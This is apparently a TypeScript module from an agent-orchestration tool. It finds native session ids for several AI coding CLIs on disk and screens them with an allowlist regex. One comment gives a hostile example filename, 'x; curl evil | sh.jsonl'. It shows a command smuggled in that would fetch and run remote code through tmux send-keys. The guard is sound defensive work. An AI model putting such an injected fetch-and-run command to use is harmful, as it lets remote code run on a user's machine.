/**
 * Per-provider on-disk native session-id discovery (profile-env aware).
 *
 * Used as the fallback when no native id was captured into the DB (Codex /
 * Gemini / OpenCode have no push-capture hook), and to power the multi-provider
 * resume picker. Pure fs reads — no DB, no tmux.
 *
 * Claude reuses the proven streaming parser in `claude-session-service.ts`
 * (keyed by `encodePath(cwd)`); the other providers use a generic "newest file
 * by mtime under the provider's home dir" heuristic. Per-provider behavior is
 * driven by the declarative registry, not inline branching.
 */

import { join } from "node:path";
import { homedir } from "node:os";
import { readdir, stat } from "node:fs/promises";
import type { AgentProviderType } from "@/types/session";
import { getResumeSpec } from "./agent-resume-registry";
import { listSessions } from "@/services/claude-session-service";

/** One discovered native session id with its last-modified time. */
export interface DiscoveredSessionId {
  sessionId: string;
  lastModified: string; // ISO
}

/** Resolve the provider's session-storage dir from the (profile-isolated) env. */
function resolveHomeDir(
  provider: AgentProviderType,
  env: Record<string, string>,
): string | null {
  const spec = getResumeSpec(provider);
  if (!spec.supportsResume) return null;
  const { homeEnvVar, defaultHomeSubpath } = spec.sessionIdSource;
  if (homeEnvVar && env[homeEnvVar]) return env[homeEnvVar];
  if (!defaultHomeSubpath) return null;
  return join(env.HOME ?? homedir(), defaultHomeSubpath);
}

/** Strip a single known extension from a filename to recover the bare native id. */
function stripExtension(name: string, exts: string[]): string {
  for (const ext of exts) {
    const suffix = `.${ext}`;
    if (name.toLowerCase().endsWith(suffix.toLowerCase())) {
      return name.slice(0, name.length - suffix.length);
    }
  }
  return name;
}

/**
 * [hgwo] Defense-in-depth: a discovered id (a readdir filename stem for
 * codex/gemini/opencode) is later typed into the shell prompt via
 * `tmux send-keys -l <cmd>` + `C-m`, so a session file named e.g.
 * `x; curl evil | sh.jsonl` would inject a command. The discovery dir is the
 * user's own profile-isolated home (low likelihood), but we still reject any id
 * with shell-significant characters — only `[A-Za-z0-9._-]` is allowed. Claude's
 * UUIDs and the providers' opaque ids pass; a non-matching id is skipped so the
 * caller relaunches FRESH instead of resuming with an unsafe id.
 */
const SAFE_SESSION_ID = /^[A-Za-z0-9._-]+$/;

function isSafeSessionId(id: string): boolean {
  return id.length > 0 && SAFE_SESSION_ID.test(id);
}

/**
 * List native session ids for a provider+cwd, newest first.
 *
 * For Claude this delegates to the streaming parser (cwd-aware). For the
 * generic providers it lists files under the provider's home dir sorted by
 * mtime. Returns at most `limit` entries (default 20).
 */
export async function listSessionIds(
  provider: AgentProviderType,
  cwd: string,
  env: Record<string, string>,
  limit = 20,
): Promise<DiscoveredSessionId[]> {
  if (provider === "claude") {
    // listSessions joins ".claude" itself, so pass the bare config dir.
    const configDir = env.CLAUDE_CONFIG_DIR;
    const sessions = await listSessions(cwd, { limit, profileConfigDir: configDir });
    // Claude ids are UUIDs (safe); filter anyway for a single uniform guard.
    return sessions
      .map((s) => ({ sessionId: s.sessionId, lastModified: s.lastModified }))
      .filter((entry) => isSafeSessionId(entry.sessionId));
  }

  const dir = resolveHomeDir(provider, env);
  if (!dir) return [];
  const spec = getResumeSpec(provider);

  try {
    const entries = await readdir(dir);
    const withMtime = await Promise.all(
      entries.map(async (name) => {
        try {
          return { name, mtime: (await stat(join(dir, name))).mtimeMs };
        } catch {
          return { name, mtime: 0 };
        }
      }),
    );
    withMtime.sort((a, b) => b.mtime - a.mtime);
    return withMtime
      .map(({ name, mtime }) => ({
        sessionId: stripExtension(name, spec.sessionIdSource.fileExtensions),
        lastModified: new Date(mtime).toISOString(),
      }))
      // Drop ids with shell-significant characters before they can reach a tmux
      // send-keys prompt line (defense-in-depth — see isSafeSessionId).
      .filter((entry) => isSafeSessionId(entry.sessionId))
      .slice(0, limit);
  } catch {
    return [];
  }
}

/** Newest native session id for the given provider+cwd, or null. */
export async function discoverLatestSessionId(
  provider: AgentProviderType,
  cwd: string,
  env: Record<string, string>,
): Promise<string | null> {
  const spec = getResumeSpec(provider);
  if (!spec.supportsResume) return null;
  const [latest] = await listSessionIds(provider, cwd, env, 1);
  return latest?.sessionId ?? null;
}
